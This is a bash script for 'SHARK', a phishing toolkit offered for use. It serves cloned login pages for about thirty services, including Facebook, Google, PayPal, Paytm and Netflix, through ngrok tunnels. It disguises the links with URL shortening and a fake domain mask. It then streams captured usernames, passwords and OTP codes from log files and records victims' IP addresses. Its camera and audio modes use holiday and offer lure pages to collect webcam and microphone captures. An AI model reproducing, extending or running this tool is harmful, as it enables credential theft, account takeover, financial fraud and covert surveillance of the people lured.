#!/bin/bash

##############################################
#                                            #
#             PROJECT: SHARK                 #
#             AUTHOR: ASHISH                 #
#              SHARK ©2020                   #
#     EMAIL: ashishsingh103020@gmail.com     #
#           BEST PHISHING TOOLS              #              
#       created by :- a s h i s h            #
#                                            #
##############################################

#########
# COLORS
#########

#colors
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[1;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
purple="\033[0;35m"                                         ##
cyan="\033[0;36m"                                           ##
cyan1="\033[1;36m"                                          ##
cafe="\033[0;33m"                                           ##
fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
l_red="\033[1;37;41m"                                       ##
nc="\033[0m"                                                ## 

##########
# VERSION
##########

VERSION="2.0.3"

################
# PRINT MESSAGE
################

msg() {
	printf "${blue}[ - ] ${green}${1}\n${nc}"
}

norm_msg() {
	printf "${green}${1}\n${nc}"
}

error_msg() {
        printf "${red}[ ! ] ${white}${1}\n${nc}"
}

#spinner
spinner() {
        pid=$!
        spin='\|/-'
        i=0
        tput civis
        while kill -0 $pid 2>/dev/null
	do	
                i=$(( (i+1) %4 ))
                printf "\r${cyan1}[${spin:$i:1}]${nc} ${cyan1} $launch"
                sleep .1
	done
        printf "\r   ${green}[✔]${nc} ${green} $splashdown"
        sleep 1;echo 
        tput cnorm
}


#####
# OS
#####

function os () {
cat /etc/os-release > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
                BIN="/usr/bin"
	        phish="/usr/share/shark/phs"
		files="$HOME/Desktop"
		shark="/usr/share/shark"
		old_shark="/usr/bin/shark"
		OS=DEBIAN 
	else	
		BIN="${PREFIX}/bin"
		phish="${PREFIX}/share/shark/phs"
		files="/sdcard"
		shark="${PREFIX}/share/shark"
                old_shark="${PREFIX}/bin/shark"
		OS=TERMUX
fi
}


function main_update() {
wget https://github.com/just-hack/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark
}


function update() {
	version=$(curl -L -s https://raw.githubusercontent.com/just-hack/shark/master/shark | grep -w "VERSION=" | head -n1)
	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
        fi
}

###########
# INTERNET
###########

#check ineternet connectivity for update
function internet() {
ping -c 1 google.com > /dev/null 2>&1
if [ $? -eq 0 -a ! "${1}" = "--update" ] && [ $? -eq 0 -a ! "$1" = "-u" ]; then
        update
fi
}


function connection() {
        ping -c 1 google.com > /dev/null 2>&1
        if [[ "$?" != 0 ]]
        then
                error_msg "No internet"
        exit 0
        fi
}

function check_update() {	
        connection
        version=$(curl -L -s https://raw.githubusercontent.com/just-hack/shark/master/shark | grep -w "VERSION=" | head -n1)
	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
        if [ ${latest_version} = ${VERSION} ];then		
                echo -e "\tReading \tpackage \tlists... \tDone
                         \tBuilding \tdependency \ttree       
                         \tReading \tstate \tinformation... \tDone
                         \tshark \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
	        exit 1
	else
		main_update
		exit 1
	fi
}

########
# USAGE
########

usage() {
        cat <<EOF
Usage: $(basename $0) [OPTIONS] available
shark - future of phishing is here,
A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
Copyright 2020 <ashishsingh103020@gmail.com>
Options:
  -u, --update      Update shark
  -v, --version     Display the current shark version installed on your device
  -h, --help        Print this help message
  -a, --assist      List detail discription of shark
  -p, --purge       Uninstall shark
  --fix-ngrok       Fix ngrok issue (add new authtoken)
  --fix-patches     Check missing packages & fix patches
For additional info, see: https://github.com/Bhaviktutorials/shark
EOF
}

function purge_shark() {
printf "${red} Do you wish to delete camera and audio files too ? y/n " && read ans && [ "$ans" != "${ans#[Yy]}" ] && rm -rf ${files}/Camera_hack ${files}/Audio_hack
rm -rf ${shark} ${old_shark}
}


function assist() {
#put manpage in man dir later
man ${shark}/manpage
}

function fix_ngrok() {
if [ $OS != "TERMUX" ]; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip
else 
wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip -O ngrok.zip
fi
unzip ngrok.zip && rm -rf ngrok.zip
printf "${green} Enter your ngrok authtoken :\n "
read authtoken
$authtoken >> /dev/null 2>&1 && chmod +x ngrok && mv ngrok $BIN
}

###########
# OPTS ARG
###########

#getopts argument
while true; do
        case "$1" in		
                -u|--update)			
	                check_update
			;;
			
                -h|--help)			
                        usage       
                        exit 1
			;;

                -v|--version)			
                        printf "version $VERSION\n"
                        exit 1
                        ;;
			
		-p|--purge)
		        purge_shark
			exit 1
			;;

		-a|--assist)
			assist
			exit 1
			;;
						
		--fix-patches)			
			sed -i -e 's/\r$//' ${shark}/setup
			chmod 777 ${shark}/setup
		        ${shark}/setup
			exit 1
			;;
			
		--fix-ngrok)
		        fix_ngrok
		        exit 1
			;;
					
                -*)			
                        echo "ERROR: unknown option '$1'" 1>&2
                        echo "see '--help' for usage" 1>&2
                        exit 1
                        ;;

                *)	
                        f=$1
                        break			
                        ;;
	esac
        shift
done

##############
# MAIN DRIVER
##############

# CHECK FILE 
file_check() {
[ ! -d "${files}/Camera_hack" ] && mkdir -p ${files}/Camera_hack
[ ! -d "${files}/Audio_hack" ] && mkdir -p ${files}/Audio_hack
}

#catch_ip camera
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "${green}[${white}+${green}] ${yellow}IP:${white} %s ${nc} \n" $ip
cat ip.txt >> saved.ip.txt
}

# KILL NGROK
function kill_ngrok() {
Kill_php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
kill_ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 ${kill_php} > /dev/null 2>&1
kill -9 ${kill_ngrok} > /dev/null 2>&1
}

function url_checker() {
if [ ! "${1//:*}" = http ]; then
	if [ ! "${1//:*}" = https ]; then
printf "${red} Invalid URL. Please use http or https. \n "
exit 1
fi
fi
}

# URL_SHORTNER
function url_shortner() {    
	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
        shorter=${short#https://}       
        read -p $'\n\033[1;94mshark \033[1;97m>> \033[1;92mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
        url_checker $mask	
	printf "${blue}shark ${white}>> ${green}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
	printf "${blue}shark ${white}>> ${green}Don't use space in your words\n"	
        read -p $'\e[1;94mshark \033[1;97m>> \e[1;92mEnter your words here :\e[0m ' words
        final_url=$mask-$words@$shorter
	printf "$final_url\n"
}


#CAMERA HACK
 
function camera_hack() {
clear && printf "\n\n"
printf "$green >>> ${white}Choose Your Tempelates\n\n"
printf "$yellow [ 1 ] ${white}Diwali \n\n";printf "$yellow [ 2 ] ${white}Freindship Dare \n\n";printf "$yellow [ 3 ] ${white}Freindship Day \n\n";printf "$yellow [ 4 ] ${white}New Year \n\n";printf "$yellow [ 5 ] ${white}Jio Offfer \n\n"
read -p $'$green >>> ${white} Enter Your Choice : \n\n' page
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
case $page in
1)
   source="diwali.html"
   ;;
2)
   source="freindship_dare.html"
   ;;
3)
   source="freinship_day.html"
   ;;
4) 
   source="happy_new_year.html"
   ;;
5)
   source="jio_offer.html"
   ;;
   
esac

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
			   while [ true ]; do
                           if [[ -e "ip.txt" ]]; then
			   printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
			   catch_ip && rm -rf ip.txt
			   fi
			   sleep 0.5
		           if [[ -e "Log.log" ]]; then
			   printf "\n${green}[${white}+${green}] Cam file received!\n\n" && rm -rf Log.log
			   fi
			   sleep 0.5
			   mv cam* ${files}/Camera_hack >> /dev/null 2>&1 
			   done
}

# Voice Hack

function audio_hack() {
default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
printf "${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://youtube.com )" $default_redirect && read redirect_link
redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
while [ true ]; do
                            if [[ -e "ip.txt" ]]; then
		 	    printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
			    catch_ip && rm -rf ip.txt			    
			    fi
			    sleep 0.5
		            if [[ -e "Log.log" ]]; then
			    printf "\n${green}[${white}+${green}] Cam file received!\n\n" && rm -rf Log.log			   
			    fi
			    sleep 0.5
			    mv 20* ${files}/Audio_hack >> /dev/null 2>&1 
			    done

}

# MAIN 
function main() {
        launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 6;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
}

while :
do
clear
printf "${blue}

        ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
       ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
       ╚█████╗ ███████║███████║██████╔╝█████═╝
        ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
       ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION}\n\n "
       
printf "${green}        =======================================\n"
printf "         ${l_red}    c r e a t e d  b y  a s h i s h    ${nc}\n "
printf "${green}        =======================================${nc}\n\n"

###change banner ---- start here
banner(){
printf "${purple}==================================================================\n\n"
printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n\n"
printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;31m[\e[0m\e[1;92m13\e[0m\e[1;31m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;31m[\e[0m\e[1;92m24\e[0m\e[1;31m] \e[0m\e[1;37;43mSnapchat\e[0m\n\n" 
printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;31m[\e[0m\e[1;92m14\e[0m\e[1;31m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;31m[\e[0m\e[1;92m25\e[0m\e[1;31m] \e[0m\e[1;37;40mProtonmail\e[0m\n\n"
printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;31m[\e[0m\e[1;92m15\e[0m\e[1;31m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;31m[\e[0m\e[1;92m26\e[0m\e[1;31m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;31m[\e[0m\e[1;92m16\e[0m\e[1;31m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;31m[\e[0m\e[1;92m27\e[0m\e[1;31m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
printf "\e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;31m[\e[0m\e[1;92m17\e[0m\e[1;31m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;31m[\e[0m\e[1;92m28\e[0m\e[1;31m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
printf "\e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;31m[\e[0m\e[1;92m18\e[0m\e[1;31m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;31m[\e[0m\e[1;92m29\e[0m\e[1;31m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
printf "\e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;31m[\e[0m\e[1;92m19\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;31m[\e[0m\e[1;92m30\e[0m\e[1;31m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;31m[\e[0m\e[1;92m20\e[0m\e[1;31m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;31m[\e[0m\e[1;92m31\e[0m\e[1;31m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n\n"
printf "${purple}==================================================================${nc}\n\n"
read -p $'\e[1;34mshark \e[1;97m>>\e[0m ' option
}


#######
# MAIN
#######

os
kill_ngrok
banner
	
         if [ $option = 01 ] || [ $option = 1 ]
         then
	                    cd ${phish}/facebook/ && main
			    tail -f usernames.txt 
                            break;
			     
	 elif [ $option = 02 ] || [ $option = 2 ]
	 then
			   cd $phish/pinterest/ && main                           
                           tail -f log.txt | grep -e "id" -e "password"
                           break;

	 elif [ $option = 03 ] || [ $option = 3 ]
	 then
		           cd $phish/instagram/ && main
			   tail -f log.txt			   
                           break;
			   
	elif [ $option = 04 ] || [ $option = 4 ]
        then
                          cd $phish/UberEats-Phishing/ && main			  
			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
                          break;
			  
        elif [ $option = 05 ] || [ $option = 5 ]
        then
                          cd $phish/ola-otpbypass/ && main
		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
                          break;
			  
         elif [ $option = 06 ] || [ $option = 6 ]
	 then
                          cd $phish/google-otp/ && main                         
		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
                          break;
			  
       elif [ $option = 07 ] || [ $option = 7 ]
       then
                          cd $phish/Paytm-Phishing/ && printf "\n"
                          printf "${red}[${white} 1 ${red}]${green} Sign In \n\n" 
                          printf "${red}[${white} 2 ${red}]${green} Sign Up \n\n"                           
                          read -p $'${red}[${green} >>> ${red}]\e[0m${green} Enter Your Choice : \e[0m' option1			  
		          if [ $option1 = 1 ] || [ $option1 = 01 ]
			  then
			        cd paytm/ && main                                
                                tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"		
	                	else                
                                cd signup/ && main                            
				fi                                
				break;
				
        elif [ $option = 08 ] || [ $option = 8 ]
	then

                          cd $phish/Netflix/ && main                          
                          tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
                          break;

           elif [ $option = 09 ] || [ $option = 9 ]
	   then
                           cd $phish/instafollow/ && main                           
                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
                           break;
			   
               elif [ $option = 10 ]
	       then
                           cd $phish/amazonsign/ && main                            
                           tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
                           break;

                  elif [ $option = 11 ]
	          then
                           cd $phish/whatsapp-phishing/ && main                          
                           tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
                           break;
			   
	          elif [ $option = 12 ]
	          then
                           cd $phish/Linkedin/ && main                           
                           tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"
                           break;
   
                     elif [ $option = 13 ]
	             then
                           cd $phish/Hotstar-otp-bypass/ && main          
                           tail -f log.txt | grep -e "phoneNo" -e "OTP"
                           break;
      
                    elif [ $option = 14 ]
	            then
                           cd $phish/spotify/ && main                          
                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"
                           break;
			   
	            elif [ $option = 15 ]
	            then
                           cd $phish/github/ && main                           
                           tail -f log.txt | grep -e "login" -e "password" -e "otp"
                           break;
			   
	        elif [ $option = 16 ]
	        then
                           cd $phish/ipfinder/ && main
                           tail -f ip.txt        
                           break;

                  elif [ $option = 17 ]
	          then
                           cd $phish/Zomato-Phishing/ && main                           
                           tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                
                           break;

                   elif [ $option = 18 ]
	           then
                           cd $phish/phonepay/ && main                        
                           tail -f log.txt | grep -e "number" -e "otp"
                           break;
			   
	            elif [ $option = 19 ]
	            then
                           cd $phish/paypal/ && main                           
                           tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"
                           break;
           
	            elif [ $option = 20 ]
	            then
                           cd $phish/telegram/ && main                        
                           tail -f log.txt | grep -e "phone_number" -e "phone_code"
                           break;
			   
	            elif [ $option = 21 ]
	            then
                           cd $phish/twitter/ && main                           
                           tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"
                           break;
                    
		    elif [ $option = 22 ]
	            then
                          cd $phish/flipcart/ && main                          
                          tail -f log.txt | grep -e "email" -e "password" -e "otp"
                          break;
       
                  elif [ $option = 23 ]
	          then
                          cd $phish/wordpress/ && main                          
                          tail -f log.txt | grep -e "log" -e "pwd"
                          break;
			  
	           elif [ $option = 24 ]
	           then
                           cd $phish/snapchat/ && main                           
                           tail -f log.txt | grep -e "username" -e "password" -e "Code"
                           break;
			   
		    elif [ $option = 25 ]
	            then
                           cd $phish/protonmail/ && main                           
                           tail -f log.txt | grep -e "username" -e "password"   
                           break;

                  elif [ $option = 26 ]
	          then
                           cd $phish/stackoverflow/ && main                           
                           tail -f log.txt | grep -e "email" -e "password"
                           break;

                  elif [ $option = 27 ]
	          then
                           cd $phish/ebay/ && main                          
                           tail -f log.txt | grep -e "userid" -e "pass" -e "pin"
                           break;

                  elif [ $option = 28 ]
	          then
                           cd $phish/twitch/ && main                           
                           tail -f log.txt | grep -e "Username" -e "password" -e "otp"
                           break;
                
		    elif [ $option = 29 ]
	            then
                           cd $phish/ajio/ && main                           
                           tail -f log.txt | grep -e "username" -e "password"
                           break;
			   
		  elif [ $option = 30 ]
	          then               
                           cd $phish/mobikwik/ && main                         
                           tail -f log.txt | grep -e "userId" -e "otp"
                           break;
			   
		  elif [ $option = 31 ]
	          then        
		  
		           cd $phish/Camera_hack && main && file_check
			   camera_hack
			   break;
			   
	           elif [ $option = 32 ]
	           then 
		            cd $phish/Audio_hack && main && file_check
			    audio_hack
		            break;
			   
	          elif [ $option = 99 ]
	          then
		      printf "\n" && exit 
		      break;
		      
                  else 
		  printf "\n${green}[${yellow}!${green}${red} Invalid option Try Again !!${white}\n"
		  sleep 0.8
		  fi
                  done
		  
		  
#####################################################################
#                                                                   #
#      simply changing this banner will not make you developer      #
#                   CREATED BY ASHISH                               #
#                   KEEP SUPPORTING                                 #
#                      THANKYOU                                     #
#                                                                   #
#####################################################################
